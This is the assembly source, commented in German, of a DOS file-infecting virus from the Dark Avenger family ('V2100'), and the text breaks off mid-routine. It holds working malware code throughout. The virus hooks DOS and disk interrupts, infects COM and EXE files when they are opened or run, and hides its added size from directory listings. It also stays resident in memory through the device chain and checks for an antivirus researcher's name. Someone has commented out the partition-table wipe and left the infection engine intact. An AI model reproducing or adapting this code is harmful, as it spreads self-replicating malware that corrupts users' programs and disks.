;--------------------------------------------------------------  
;       V2100.ASM
;
;       Source von V2100.COM / noch ein Dark-Avenger-Virus
;
;       Stealth
;       Zerstîrt BOOT+Partitionstabelle
;       Infiziert COM+EXE
;       LÑdt sich in oberen Speicherbereich
;
;--------------------------------------------------------------  
code    SEGMENT
        ASSUME CS:code, DS:code
        .RADIX 16
        SMART
        ORG 100h
;--------------------------------------------------------------  
;       Struktur des Disk-Parameter-Blocks
;--------------------------------------------------------------  
DPB     Struc
        drive           db      ?      ; +0
        Subunit         db      ?      ; +1
        SecSize         dw      ?      ; +2
        SecPerCluster   db      ?      ; +4
        ClusToSecShift  db      ?      ; +5
        BootSize        dw      ?      ; +6
        NumberOfFATs    db      ?      ; +8
        RootDirNumber   dw      ?      ; +9
        FstDataSector   dw      ?      ; +0b
        MaxCluster      dw      ?      ; +0d
        SecsPerFAT      db      ?      ; +0f
        RootSector      dw      ?      ; +10
        Device          dd      ?      ; +12
        MediaDescrpt    db      ?      ; +16
        Accesflag       db      ?      ; +17
        NextBlock       dd      ?      ; +18
DPB     ends
;--------------------------------------------------------------  
start:  JMP     VirStart
        ;-----------------------------------------------------
        ;       Die NOPS sind fÅr den TD unbedingt notwendig !
        ;-----------------------------------------------------
	NOP	
	NOP	
	NOP	
	NOP	
	NOP	
	NOP	
	NOP	
        NOP
	NOP	
	NOP	
	NOP	
	NOP	
	NOP	
        NOP     
        NOP     
	NOP	
	NOP	
	NOP	
	NOP	
	NOP	
;-----------------------------------------------------        
FirstByte:      DB      00h              ; Ofs 0
                DB      "Eddie lives"    ; Ofs 1..0b
                DB      00h              ; Ofs 0c
                DB      0DCh             ; Ofs 0d
                DB      14h              ; Ofs 0e
                DB      00h              ; Ofs 0f
                DB      00h              ; Ofs 10
        ;=======( eingefÅgt )=================================
Infected        DB      7,'INFECTED',0
destroyed       DB      7,'DESTROYED',0
Down            DB      7,'DOWN',0
        ;=====================================================
DisplayActivity:
        PUSH    AX
        PUSH    BX
        PUSH    SI
        PUSH    BX
        MOV     AH,0Eh  ; TTY-Ausgabe
        MOV     BL,71h
        MOV     SI,Offset Destroyed-Offset Firstbyte
  nextchar:
        LODSB
        or      al,al
        JZ      FERTIG
        INT     10H
        JMP     NextChar
  fertig:
        POP     AX
        POP     BX
        POP     SI
        RET
        ;==========================================
;-----------------------------------------------------        
PushAll:PUSH    AX               ; Offset 11h
	PUSH	BX 
	PUSH	CX 
	PUSH	DX 
	PUSH	SI 
	PUSH	DI 
	PUSH	DS 
	PUSH	ES 
	MOV	BX,SP
        JMP     Word Ptr SS:[BX+10h] ; == RET, Aber alle Register gesichert
        ;-----------------------------------------------------        

JmpEXE:         ADD     SI,Offset IP_Init       ;081Ah    ;Offset 1Fh
                MOV     BX,ES
                ADD     BX,10h

;---------------------------------------------------------------------
;VirusStartOffset EQU    Offset FirstByte
;SegmentOffset    EQU    Offset Exe_segment+Offset IP_Init
;OffsetOffset     EQU    Offset Exe_Offset -Offset IP_Init
;ErsteZahl        EQU    (-SegmentOffset + VirusStartOffset)
;ZweiteZahl       EQU    (-OffsetOffset  + VirusStartOffset)
;------( der assembler mag nicht )------------------------------------
;ADD     BX,Word Ptr CS:[SI+02h]         ; Relocate;
;MOV     Word Ptr CS:[SI-ErsteZahl],BX   ; +F831
;MOV     BX,Word Ptr CS:[SI]
;MOV     Word Ptr CS:[SI-ZweiteZahl],BX  ; +F82F
;=====================================================================
                ADD     BX,Word ptr CS:[SI+2]
                MOV     Word Ptr CS:[Offset Exe_Segment-Offset FirstByte],BX
                MOV     BX,Word ptr CS:[SI]
                MOV     Word Ptr CS:[Offset Exe_Offset-Offset FirstByte],BX
;======================================================================
                MOV     BX,ES
                ADD     BX,10h
                ADD     BX,Word Ptr CS:[SI+04h]
                MOV     SS,BX
                MOV     SP,Word Ptr CS:[SI+06h]
        ;-----------------------------------------------------        
                DB      0EAh
Exe_Offset      DW      ?       ; Offset 161h
Exe_Segment     DW      ?       ; JMP 0000:0000 ; JMP EXE-CODE
        ;-----------------------------------------------------        
VirStart:       CALL    J0045F          ; Adresse 168h auf Stack
;-------------------------------------------------------------        
InstallDevice:
INT 3
        RETF            ; DAS wollen wir besser nicht zulassen !!!!!!!!!!

        DEC     DI       ; Offset 50h
	DEC	DI 
	PUSH	CS 
        CALL    FirstBIOSCall
	INC	DI 
	INC	DI 
FirstBIOSCall: 
        PUSH    DS 
        PUSH    Word Ptr DS:[DI+08h]
	RETF	
        ;-----------------------------------------------------        
ModifyFilesize_in_FCB: 
        CALL    INT21           ; Offset 5Dh
	TEST	AL,AL
        JNZ     J001DA          ; Keine passende Datei gefunden
	PUSH	AX 
	PUSH	BX 
	PUSH	SI 
	PUSH	DI 
	PUSH	DS 
	PUSH	ES 
        MOV     AH,51h          ; Get current PSP
        INT     21H             
        MOV     ES,BX           
        CMP     BX,Word Ptr ES:[0016h]  ; PSP des COMMAND.COM ??
	JNZ	J001D3
	MOV	SI,DX
        MOV     AH,2Fh          ; GET DTA
        INT     21H             ; ES:BX <- DTA              
	LODSB	
	INC	AL
	JNZ	J0019D
	ADD	BX,+07h
J0019D: INC	BX 
        MOV     DI,0002h
        JMP     SHORT CheckFileForStealth
        ;-----------------------------------------------------        
StealthFilesize: 
        CALL    INT21           ; Offset 8Bh
	JB	J001DA
	PUSH	AX 
	PUSH	BX 
	PUSH	SI 
	PUSH	DI 
	PUSH	DS 
	PUSH	ES 
        MOV     AH,2Fh           ; Get DTA
        INT     21H              ; ES:BX <- DTA       
	XOR	DI,DI
CheckFileForStealth: 
        PUSH    ES 
	POP	DS 
        MOV     AX,Word Ptr DS:[BX+16h]      ; Hole Filedatum
        AND     AL,1Fh                       ; Sekunde auf '62' gesetzt ?
	CMP	AL,1Fh
        JNZ     J001D3                       ; nein, dann geben wir die 
        MOV     AX,Word Ptr DS:[BX+DI+1Ah]   ; echte LÑnge zurÅck.
        MOV     SI,Word Ptr DS:[BX+DI+1Ch]   ; sonst : ziehe 2100 ab..
        SUB     AX,2100d                     ; =0834h
	SBB	SI,+00h
	JB	J001D3
        MOV     Word Ptr DS:[BX+DI+1Ah],AX
        MOV     Word Ptr DS:[BX+DI+1Ch],SI
J001D3: POP	ES 
	POP	DS 
	POP	DI 
	POP	SI 
	POP	BX 
	POP	AX 
	CLC	
J001DA: INC	SP 
	INC	SP 
        JMP     @IRET
        ;-----------------------------------------------------        
J001DF: JMP     ModifyFilesize_in_FCB           ; Offset C7h
        ;-----------------------------------------------------        
        ;=====================================================
        ;      vvvv--- Hier wird neuer Code hingebastelt -vvvv
        ;-----------------------------------------------------        
VirINT24:MOV     AL,03h                         ; Offset C9h
         IRET                 ; INT24h / Operation failed ! 
        ;-----------------------------------------------------        
VirEXEC:CALL    J006E0                          ; Offset CCh
        CALL    Zerstoere
        MOV     BYTE PTR CS:[Offset Bontchev_Flag-Offset Firstbyte],01h
                                                ; 877h
ToINT21h: 
        POPF    
JmpToINT21H: 
        JMP     DWord Ptr CS:[Offset INT21H-Offset FirstByte]
        ;-----------------------------------------------------        
VirInt27H:                                      ; Offset DEh
        CALL    Virus_KEEP_Procedure
        JMP     DWord Ptr CS:[Offset INT27H-Offset FirstByte] 
        ;-----------------------------------------------------        
KEEP:   CALL    Virus_KEEP_Procedure            ; Offset E6h
        JMP     ToINT21h
        ;-----------------------------------------------------        
VirInt21h: 
        STI                                     ; Offset 00EBh
	PUSHF	
	CLD	
        CMP     AH,11h          ; FindFirst FCB
	JZ	J001DF
        CMP     AH,12h          ; Findnext FCB
	JZ	J001DF
        
        CMP     AH,4Eh          ; Findfirst ASCIIZ
        JZ      StealthFilesize
        CMP     AH,4Fh          ; FindNext ASCIIZ
        JZ      StealthFilesize
        
        CALL    Suche_Bontchev
        
        CMP     AX,2521h        ; SET Int 21h
        JZ      VirSetInt21H
        CMP     AX,2527h        ; Set Int 27H
        JZ      VirSetInt27H  
        
        CMP     AX,3521h        ; GET Int 21H
;==============================
GET21LABEL      EQU     $-2     ; zeigt auf "3521"
JmpLABEL        EQU     $+1     ; zeigt auf "57", Sprungweite
;==============================
        JZ      VirGetInt21H
        CMP     AX,3527h        ; GET INT 27H
        JZ      VirGetInt27H
        
        CMP     AH,31h          ; KEEP
KEEPLABEL:                      ; ofs 234h
        JZ      KEEP
        CMP     AX,4B00h        ; EXEC 
        JZ      VirEXEC
        
        CMP     AH,3Ch          ; Create File
	JZ	J0024A
        CMP     AH,3Eh          ; close file
        JZ      CLOSEFile
        CMP     AH,5Bh          ; Make New File
	JNZ	J002B0
        
J0024A: CMP     WORD PTR CS:[Offset VirusEnde-Offset FirstByte],+00h ; CS:93Ch
        JNZ     J002CC          ;
        CALL    CheckFile       ; 
        JNZ     J002CC          ; NZ-> EXE oder COM
	POPF	
        CALL    INT21
        JB      @IRET          
	CALL	J003F8
J00260: CLC	
@IRET:  RETF    0002h
        ;-----------------------------------------------------        
VirSetInt27H: 
        MOV     Word Ptr CS:[Offset INT27H     - Offset FirstByte],DX  
        MOV     Word Ptr CS:[Offset INT27H + 2 - Offset FirstByte],DS 
        POPF    
	IRET	
        ;-----------------------------------------------------        
VirSetInt21H: 
        MOV     Word Ptr CS:[Offset INT21H     - Offset FirstByte],DX    
        MOV     Word Ptr CS:[Offset INT21H + 2 - Offset FirstByte],DS     
	POPF	
	IRET	
        ;-----------------------------------------------------        
VirGetInt27H: 
        LES     BX,DWord Ptr CS:[Offset INT27H - Offset FirstByte]  
	POPF	
	IRET	
        ;-----------------------------------------------------        
VirGetInt21H: 
        LES     BX,DWord Ptr CS:[Offset INT21H - Offset FirstByte]  
	POPF	
	IRET	
        ;-----------------------------------------------------        
CLOSEFile: 
        CMP     BX,Word Ptr CS:[Offset VirusEnde-Offset FirstByte]
	JNZ	J002CC
	TEST	BX,BX
	JZ	J002CC
	POPF	
        CALL    INT21
        JB      @IRET
	PUSH	DS 
	PUSH	CS 
	POP	DS 
	PUSH	DX 
        MOV     DX,Offset J0093E-Offset Firstbyte
        CALL    Zerstoere
        MOV     WORD PTR CS:[Offset VirusEnde-Offset FirstByte],0000h 
	POP	DX 
	POP	DS 
	JMP	J00260
        ;-----------------------------------------------------        
J002B0: CMP     AX,4B01h        ; Load Overlay
        JZ      J002C9
        CMP     AH,3Dh          ; Open file
	JZ	J002C4
        CMP     AH,43h          ; Change Fileattribut
	JZ	J002C4
        CMP     AH,56h          ; rename File
	JNZ	J002CC

J002C4: CALL    CheckFile
        JNZ     J002CC          ; NZ -> EXE oder COM

J002C9: CALL    Zerstoere

J002CC: JMP     ToINT21h
        ;-----------------------------------------------------        
CheckFile: 
        PUSH    AX 
	PUSH	SI 
	MOV	SI,DX

SuchEXT:LODSB   
	TEST	AL,AL
	JZ	J002FC
        CMP     AL,'.'
        JNZ     SuchEXT
        
        CALL    GetChar
	MOV	AH,AL
        CALL    GetChar
        CMP     AX,'oc'         ; ein COM-File ?
	JZ	J002F5
        CMP     AX,'xe'         ; ein EXE-File ?
	JNZ	J002FE
        CALL    GetChar
        CMP     AL,'e'
	JMP	SHORT J002FE
        ;-----------------------------------------------------        
J002F5: CALL    GetChar
        CMP     AL,'m'          ; war es ein COM-File ??
	JMP	SHORT J002FE
        ;-----------------------------------------------------        
J002FC: INC     AL              ; Lîscht ZF !
J002FE: POP	SI 
	POP	AX 
	RETN	
        ;-----------------------------------------------------        
GetChar:LODSB   
        CMP     AL,'C'  ; 43h   ; Buchstaben zwischen 'C'und 'Y'
        JB      J0030C          ; werden in Kleinschrift gewandelt
        CMP     AL,'Y'  ; 59h
	JNB	J0030C
        ADD     AL,20h          
J0030C: RETN	
        ;------------( virus callt int 21h )------------------
INT21:  PUSHF
	PUSH	CS 
        CALL    JmpToINT21H
	RETN	
        ;-----------------------------------------------------        
Zerstoere: 
        CALL    PushAll
	MOV	SI,DS
        ;------------------------- Get Int 24h -----------------
        XOR     AX,AX
	MOV	DS,AX
        MOV     DI,13h*4
        LES     AX,Dword Ptr DS:[DI+44h]     
        PUSH    ES 
	PUSH	AX 
        ;------------------------- Set Int 24h -----------------
        MOV     WORD PTR DS:[DI+44h],Offset VirINT24-Offset FirstByte
        MOV     Word Ptr DS:[DI+46h],CS
        ;------------------------- Get Int 13h -----------------
        LES     AX,Dword Ptr DS:[DI]
        MOV     Word Ptr CS:[Offset INT13H+1-Offset FirstByte],AX ; CS:92B
        MOV     Word Ptr CS:[Offset INT13H+3-Offset FirstByte],ES ; CS:92D
        ;------------------------- Set Int 13h -----------------
        MOV     WORD PTR DS:[DI    ],Offset VirInt13H-Offset FirstByte
        MOV     Word Ptr DS:[DI+02h],CS
	PUSH	ES 
	PUSH	AX 
	PUSH	DI 
	PUSH	DS 
        MOV     AH,54h          ; Get verify-Status
        INT     21H          
	PUSH	AX 
        MOV     AX,2E00h        ; Set verify-Status OFF
        INT     21H                          
	MOV	DS,SI
        MOV     AX,4300h        ; Get Fileattribut
        CALL    INT21
	JB	J0038B
	TEST	CL,04h
	JNZ	J0038B
	MOV	BX,CX
        AND     CL,0FEh
	CMP	CL,BL
        MOV     AX,4301h        ; Set Fileattribut
	PUSH	AX 
	JZ	J0036C
        CALL    INT21
	CMC	
J0036C: PUSHF	
	PUSH	DS 
	PUSH	DX 
	PUSH	BX 
        MOV     AX,3D02h        ; ôffne R/W
        CALL    INT21
	JB	J00381
	XCHG	AX,BX 
        CALL    INFECT_File
        MOV     AH,3Eh          ; Close file
        CALL    INT21
J00381: POP	CX 
	POP	DX 
	POP	DS 
	POPF	
	POP	AX 
	JNB	J0038B
        CALL    INT21
J0038B: POP	AX 
        MOV     AH,2Eh          ; Set verify-Status
        INT     21H                              
	POP	DS 
        MOV     AL,Byte Ptr DS:[046Ch]      ; Get Timer-Byte 000:46C
        DEC     AX              
        OR      AL,byte Ptr DS:[043Fh]      ; Get Disk-Motor-Status, 
                                ; -> welches Laufwerk war grade 
                                ;    eben eingeschaltet ????????
        AND     AL,0Fh          
	JNZ	J003E1
        MOV     DL,80h          ; Platte C:
        MOV     AH,08h          ; Get drive-parameters
        INT     13H
	JB	J003E1
        MOV     DI,0010h        ;
J003A8: MOV     AX,0201h        ; Lese 1 Sektor
        MOV     BX,Offset Buffer - Offset FirstByte ; 0880h; nach CS:998h
        MOV     DL,80h          ; Platte C:
        INT     13H             ; Welcher Sektor steht in CX....
        ;-----------------------------------------------------------
        CMP     WORD PTR CS:[BX    ],1F0Eh  ; scanne 0e 1f 83 2e 
        JNZ     J003D8                      ; PUSH CS, POP DS
        CMP     WORD PTR CS:[BX+02h],2E83h  ; SUB Word Ptr DS:[xxxx],yyyy
	JNZ	J003D8
        ;-----------------------------------------------------------
        MOV     AX,0202h        ; Lese 2 Sektoren
	PUSH	BX 
        MOV     BH,0Ah          ; Puffer ist 10 byte dahinter
        DEC     CX              ; 2 Sektoren davor lesen
	DEC	CX 
        INT     13H                 
	POP	BX 
        ;-----------------------------------------------------        
        ;       MOV     AX,0303h        ; Drei Sektoren Åberschreiben
        ;       MOV     CX,0001h        ; Sektor Nummer 1 / Partitionssektor !
        ;       XOR     DH,DH           ; Kopf 0 
        ;       INT     13H             ; Kaputt !         
        ;======( eingefÅgt )=======================
        CALL    DISPLAYACTIVITY
        ;==========================================
	JMP	SHORT J003E1
        ;-----------------------------------------------------        
J003D8: TEST    CH,CH
	JZ	J003E1
	DEC	CH
	DEC	DI 
	JNZ	J003A8
J003E1: POP	DI 
        POP     Word Ptr DS:[DI]
        POP     Word Ptr DS:[DI+02h]
        POP     Word Ptr DS:[DI+44h]
        POP     Word Ptr DS:[DI+46h]
        
PopALL: POP     ES 
	POP	DS 
	POP	DI 
	POP	SI 
	POP	DX 
	POP	CX 
	POP	BX 
	POP	AX 
	INC	SP 
	INC	SP 
	RETN	
        ;-----------------------------------------------------        
J003F8: CALL    PushAll
	PUSH	CS 
	POP	ES 
        MOV     DI,Offset VirusEnde-Offset FirstByte
	STOSW	
	MOV	SI,DX
        MOV     CX,0050h
J00406: LODSB	
	STOSB	
	TEST	AL,AL
        JZ      PopALL
	LOOP	J00406
        MOV     Word Ptr ES:[Offset VirusEnde-Offset FirstByte],CX
        JMP     PopALL
        ;-----------------------------------------------------        
Suche_Bontchev: 
        CALL    PushAll
	PUSH	CS 
	POP	DS 
        CMP     BYTE Ptr DS:[Offset Bontchev_Flag-Offset FirstByte],00h; CS:98F
        JZ      PopALL
        MOV     AH,51h
        CALL    INT21
	MOV	ES,BX
        MOV     CX,Word Ptr ES:[0006h]
	SUB	DI,DI
J0042F: MOV     SI,Offset BontChev-Offset FirstByte
	LODSB	
	REPNZ   SCASB	
	JNZ	J00446
        ;--------------------------------------
        ; BONTCHEV gefunden. System aufhÑngen !        
        ;--------------------------------------
        PUSH    CX 
	PUSH	DI 
        MOV     CX,0007h
	REPZ    CMPSB	
	POP	DI 
	POP	CX 
	JNZ	J0042F
        ; ---------------------- refresh-timer verstellen ---------------
        ;       MOV     AL,54h
        ;       OUT     43h,AL           ; ergibt ParitÑtsfehler !
        ;======( eingefÅgt )=======================
        CALL    DISPLAYACTIVITY
        ;==========================================

J00446: MOV     BYTE Ptr DS:[Offset Bontchev_Flag-Offset FirstByte],00h
        JMP     PopALL   ; == RET
        ;-----------------------------------------------------        
JmpCOM: MOV     DI,0100h
        ADD     SI,Offset OldCode-Offset FirstByte
        MOV     SP,Word Ptr DS:[0006h]
	XOR	BX,BX
	PUSH	BX 
	PUSH	DI 
	MOVSB	
	MOVSW	
	RETN	
        ;-----------------------------------------------------        
J0045F: POP     SI                                       ; Get IP
        SUB     SI,Offset InstallDevice-Offset FirstByte
	CLD	
        INC     WORD PTR CS:[SI+Offset Generation - Offset Firstbyte]
        NOT     BYTE PTR CS:[SI+Offset BontChev- Offset FirstByte]
        CMP     WORD PTR CS:[SI+Offset OldCode - Offset FirstByte],'MZ'
	JZ	J00486
	CLI	
        MOV     SP,SI
        ADD     SP,Offset @Stack-Offset Firstbyte
	STI	
        CMP     SP,Word Ptr DS:[0006h]
        JNB     JmpCOM       ; Zuwenig Stack , keine Infektion mîglich !
        
J00486: PUSH	AX 
	PUSH	ES 
	PUSH	SI 
	PUSH	DS 
	MOV	DI,SI
        ;------------------------- Get Int 13h -----------------
        XOR     AX,AX
	PUSH	AX 
	MOV	DS,AX
        LDS     DX,DWord Ptr DS:[13h*4] ; Get INT 13 in DS:DX
        
        MOV     AH,30h
        INT     21H                     ; Get DOS-version
        MOV     Byte Ptr CS:[SI+Offset DOS_Version -Offset Firstbyte],AL  
        
        CMP     AL,03h                  ; Dosversion 3 ??        
	JB	J004AE
        
        MOV     AH,13h                  ; Swap INT 13h-Handler
        INT     2FH                     ; Jetzt enthÑlt DS:DX und
                                        ; ES:BX aber ROM-Entry
        PUSH    DS                                
        PUSH    DX                      ; Merk Dir den ROM-Entry
        MOV     AH,13h                  ; und swappe zurÅck !
        INT     2FH
	POP	DX 
        POP     DS
        ;---------------------------------------------------------------------------       
J004AE: MOV     Word Ptr CS:[SI+Offset Int13ROM_Entry+1-Offset FirstByte],DX  
        MOV     Word Ptr CS:[SI+Offset Int13ROM_Entry+3-Offset FirstByte],DS
        MOV     Word Ptr CS:[SI+Offset Int13JMP      +1-Offset Firstbyte],DX
        MOV     Word Ptr CS:[SI+Offset Int13JMP      +3-Offset Firstbyte],DS
        
	POP	DS 
        PUSH    DS              ; AX=0 als DS vom Stack holen
        MOV     AX,Word Ptr DS:[0102h]   
                                ; Segment INT 40h (Disk-Bios-Entry) holen
        CMP     AX,0F000h       ; zeigt es ins ROM  ?
        JNZ     J00542          ;
        
        MOV     Word Ptr CS:[SI+Offset Int13ROM_Entry+1-Offset FirstByte],AX
        MOV     AX,Word Ptr DS:[0100h]
        MOV     Word Ptr CS:[SI+Offset Int13ROM_Entry+3-Offset FirstByte],AX
        
        MOV     DL,80h          ; DL auf Festplatte C: einstellen
        MOV     AX,Word Ptr DS:[0106h] ; Adresse des BPB des Platte C: holen
        CMP     AX,0F000h        ; Zeiger ins ROM ?
	JZ	J004FF
        CMP     AH,0C8h          ; Zeiger in Segment C800 ?
	JB	J00542
        CMP     AH,0F4h          ; Zeiger in Segment F400 ?
        JNB     J00542          
        
        TEST    AL,7Fh          ; auf xxXX:xxxx  ?
        JNZ     J00542          ; Auf xxXX:xxxx !
        MOV     DS,AX           ; DS einstellen
        CMP     WORD Ptr DS:[0000h],0AA55h ; ist dort eine BIOS-Kennung ?
        JNZ     J00542          ; nein
        MOV     DL,Byte  Ptr DS:[0002h] 
                                ; ?? LÑnge des Bios ?? holen  
        
J004FF: MOV	DS,AX
	XOR	DH,DH
        MOV     CL,09h          ; DX * 512 
	SHL	DX,CL
	MOV	CX,DX
	XOR	SI,SI
J0050B: LODSW           ;------- Code-Analyse ! --------------------
        CMP     AX,0FA80h       ; CMP DL,xx 
	JNZ	J00519
	LODSW	
        CMP     AX,7380h        ; CMP DL,80h
        JZ      J00524          ;  JNB xxxx
        
        JNZ     J0052E
J00519: CMP     AX,0C2F6h       ; TEST DL,xx
        JNZ     J00530          ; 
	LODSW	
        CMP     AX,7580h        ; TEST Dl,80h
        JNZ     J0052E          ; JBE  xxxx
        
J00524: INC	SI 
	LODSW	
        CMP     AX,40CDh        ;INT 40h. Suche danach den INT 40-Aufruf
	JZ	J00535
	SUB	SI,+03h
J0052E: DEC	SI 
	DEC	SI 
J00530: DEC	SI 
	LOOP	J0050B
	JMP	SHORT J00542
        ;-----------------------------------------------------        
J00535: SUB     SI,+07h
        
        MOV     Word Ptr CS:[DI+Offset Int13JMP + 1 - Offset FirstByte],SI
        MOV     Word Ptr CS:[DI+Offset Int13JMP + 3 - Offset FirstByte],DS

J00542: MOV     SI,DI
	POP	DS 
        ;------------------------- Get Int 21h -----------------
        LES     AX,Dword Ptr DS:[21h*4]            
        MOV     Word Ptr CS:[SI+Offset INT21H     - Offset FirstByte],AX  
        MOV     Word Ptr CS:[SI+Offset INT21H + 2 - Offset FirstByte],ES
	PUSH	CS 
	POP	DS 
        NOT     BYTE Ptr DS:[SI+Offset Bontchev-Offset FirstByte]
        
        CMP     AX,Offset VirInt21h-Offset FirstByte
        JNZ     J0056B                  ; Noch nicht verbogen !
        XOR     DI,DI    
        
        MOV     CX,Offset Int13ROM_Entry + 1 - Offset FirstByte
	REPZ    CMPSB	
	JNZ	J0056B
	POP	ES 
	JMP	J005F0
        ;---------------( berechnen der neuen Position im RAM )-----
J0056B: POP     DS 
	PUSH	DS 
	MOV	AX,SP
	INC	AX 
        MOV     CL,04h
	SHR	AX,CL
	INC	AX 
	MOV	CX,SS
	ADD	AX,CX
	MOV	CX,DS
	DEC	CX 
	MOV	ES,CX
        MOV     DI,0002h
        MOV     DX,010Ch
        MOV     CX,Word Ptr DS:[DI]
	SUB	CX,DX
	CMP	CX,AX
	JB	J005EF
        
	POP	AX 
        SUB     Word Ptr ES:[DI+01h],DX
        MOV     Word Ptr DS:[DI    ],CX
	MOV	ES,CX
	MOV	AX,CX
	CALL	J008F2
	MOV	BX,AX
	MOV	CX,DX
	MOV	AX,DS
	CALL	J008F2
        ADD     AX,Word Ptr DS:[DI+04h]
	ADC	DX,+00h
	SUB	AX,BX
	SBB	DX,CX
	JB	J005B2
        SUB     Word Ptr DS:[DI+04h],AX
J005B2: POP	SI 
	PUSH	SI 
	PUSH	DS 
	PUSH	CS 
	XOR	DI,DI
	MOV	DS,DI
        ;------------------------- Get Int 27h -------------------------
        LDS     AX,DWord Ptr DS:[27h*4]              ; Hole INT 27H
        MOV     Word Ptr CS:[SI+Offset INT27H     -Offset FirstByte],AX    
        MOV     Word Ptr CS:[SI+Offset INT27H + 2 -Offset FirstByte],DS
	POP	DS 
        MOV     BYTE Ptr DS:[SI+Offset Bontchev_Flag-Offset FirstByte],00h 
        
        ;---------------------------------------------------------------
        MOV     CX,Offset Buffer-Offset Firstbyte ; 0440h; 997h kopieren
        REPZ    MOVSW   ; Ins obere RAM kopieren
        
        ;------------------------- Set Int 21h -----------------
        XOR     AX,AX
	MOV	DS,AX
        MOV     WORD PTR DS:[21h*4  ],Offset VirInt21h-Offset FirstByte
        MOV     WORD PTR DS:[21h*4+2],ES
        ;------------------------- Set Int 27h -----------------
        MOV     WORD PTR DS:[27h*4  ],Offset VirInt27H-Offset FirstByte
        MOV     WORD PTR DS:[27h*4+2],ES
        MOV     ES:[Offset VirusEnde-Offset FirstByte],AX   
        
J005EF: POP     ES 
J005F0: POP	SI 
        ;------------------------- Get Int 13h -----------------
        XOR     AX,AX
	MOV	DS,AX
        MOV     AX,Word Ptr DS:[13h*4]
        MOV     Word Ptr CS:[SI+Offset int13JMP+1-Offset FirstByte],AX
        MOV     AX,Word Ptr DS:[13h*4+2]
        MOV     Word Ptr CS:[SI+Offset Int13JMP+3-Offset FirstByte],AX
        ;------------------------- Set Int 13h -----------------
        
        MOV     WORD Ptr DS:[13h*4],Offset VirInt13h-Offset FirstByte
        ADD     Word Ptr DS:[13h*4  ],SI    ; SI = Offset FirstByte
        MOV     Word Ptr DS:[13h*4+2],CS
        
        POP     DS 
	PUSH	DS 
        
	PUSH	SI 
        
        MOV     DS,Word Ptr DS:[002Ch]  ; Get Envir-Segment
	XOR	SI,SI
J0061C: LODSW	
	DEC	SI 
        TEST    AX,AX           ; Suche Ende des Environments
	JNZ	J0061C
        
        POP     DI              ; = mov di,Offset Firstbyte
	PUSH	DI 
	PUSH	ES 
        CMP     BYTE PTR CS:[DI+Offset DOS_Version-Offset FirstByte],03h 
	JB	J00635
        ADD     SI,+03h         ; zeigt auf grade gestartetes File
        MOV     AX,121Ah        ; get File's drive, DS:SI->Filename
        INT     2FH             ; AL <- Drive
        ;----------------------------------------------------------
J00635: MOV     DL,AL
        MOV     AH,32h          ; Get DPB
        INT     21H             ; DS:BX zeigt auf Disk-Parm-Block
                                ; DS ist dabei immer das DOS-Segment
        ;===========================================================
        ;0275:033A 0E 00 05 E0 03 00 00 00   originaler DPB
        ;0275:0342 00 00 00 00 00 1B 5E 03
        ;0275:034A 75 02 01 00 00 00 00 00
        ;========================================
        ;  es:0215 1A 02 04 xx xx xx xx xx   Neuer "DPB" im CS
        ;  es:021D xx xx xx xx xx xx 55 02
        ;  es:0225 D1 30 01 00 00 00 xx xx
        ;========================================
        ;  ds:01AE 43 4C 4F 43 4B 24 20 20 CLOCK$
        ;  ds:01B6 CA 01 70 00 40 08 DC 05
        ;  ds:01BE 34 06 ...................  Erste returnadresse
        ;                05 80 .............  Zweite returnadresse
        ;                      00 01 00 00
        ;===========================================================
	PUSH	CS 
        POP     ES              ; ES ist CS

        ADD     DI,Offset VirInt24-Offset Firstbyte
                                ; DI war Offset Firstbyte
        MOV     SI,DI           ; SI = Offset VIRINT24h

        MOV     AL,1Ah          ; Drive
        MOV     AH,Byte Ptr DS:[BX+DPB.SubUnit]
        STOSW                   ; AX -> ES:DI   ( Drive+Subunit)
        MOV     AL,04h
        STOSB                   ; AL -> ES:DI   ( Sectorsize )
        
        ADD     DI,+0Ah         ; DI <- Offset Virint24h+13h
                                ; DI = Offset ToINT21h-1

        MOV     DX,Word Ptr DS:[BX+DPB.FstDataSector]
        CMP     Byte Ptr CS:[SI+Offset DOS_Version-Offset VirInt24],AL
        JB      J0065A                 
	INC	BX 

J0065A: MOV     AL,byte Ptr DS:[BX+DPB.MediaDescrpt]
	STOSB	

	MOV	AX,SI
        ADD     AX,0040h        ; AX = Ofs VirInt24+40h
                                ; AX = Offset 221h, Byte vor "CMP AX,2527"
        STOSW                   ;
	MOV	AX,ES
        STOSW                   ;
        MOV     AX,0001h        ;
        STOSW                   ;
        DEC     AX              ; AX = 0
        STOSW                   ;
;------------------------------------------------------------------
        LDS     DI,DWord Ptr DS:[BX+DPB.Device]
        
        MOV     BX,SI           ; jetzt zeigt BX auf Virint24
        ;----------------------------------------------------------
        PUSH    CS              ; AX=0
                                ; DS:DI zeigt auf Link;
                                ; ES:BX = residentes VirInt24h
        CALL    InstallDevice
        ;----------------------------------------------------------
        ; Installation des Virus als 'device'
        ; Hier installiert es sich durch die Hintertuer !!!
        ;----------------------------------------------------------
        ;
        ;-------( Hier wird der Code verÑndert  )------------------
        ;
        ;----------------------------------------------------------
                                        ; ES=CS !

        SHL     BYTE PTR ES:[BX+02h],1  ; aus 04 wird 08,
                                        ; Ofs virint24 + 2  ; Ofs 1e3
        
        INC     BYTE PTR ES:[BX+Offset JMPLabel-Offset Virint24]
                                        ; JZ 0283 -> JZ 284
                                        ; Ofs Virint24 + 4ah; Ofs 22B

        AND     BYTE PTR ES:[BX+Offset JMPLabel-Offset VirInt24],0Fh
                                        ; JZ 284 -> JZ 234
                                        ; nach CMP AH,31h
                                        ; Ofs VirInt24 + 4ah
	PUSHF	
	JNZ	J006A3
        MOV     AX,Word Ptr ES:[BX+Offset Get21Label-Offset Virint24]
                                        ; 3521, aus 'CMP AX,3521'
                                        ; Ofs Virint24 + 48h; Ofs 229

        ADD     AX,0040h                ; AX = 3561

        CMP     AX,Word Ptr ES:[BX+Offset Keeplabel-Offset Virint24]
                                        ; 744B = JZ 01FE
                                        ; Ofs Virint24 + 53h; Ofs 234
	JB	J0069F
        INC     AX                      ; AX = 3562
        AND     AX,003Fh                ; AX = 0022
        ADD     AX,DX                   ; DX ist DPB.DataSektor
        CMP     AX,Word Ptr ES:[BX+Offset Keeplabel-Offset Virint24]
                                        ; 744B
                                        ; Ofs Virint24 + 53h
	JNB	J006B3
J0069F: MOV     Word Ptr ES:[BX+Offset Get21Label-Offset Virint24],AX
                                        ; Ofs Virint24 + 48h
J006A3: 
        ;----------------------------------------------------------
        PUSH    CS 
        CALL    InstallDevice
        ;----------------------------------------------------------
        
	POPF	
	JNZ	J006B2
        MOV     Word Ptr ES:[BX+Offset JMPToInt21H-Offset VirInt24+4],AX
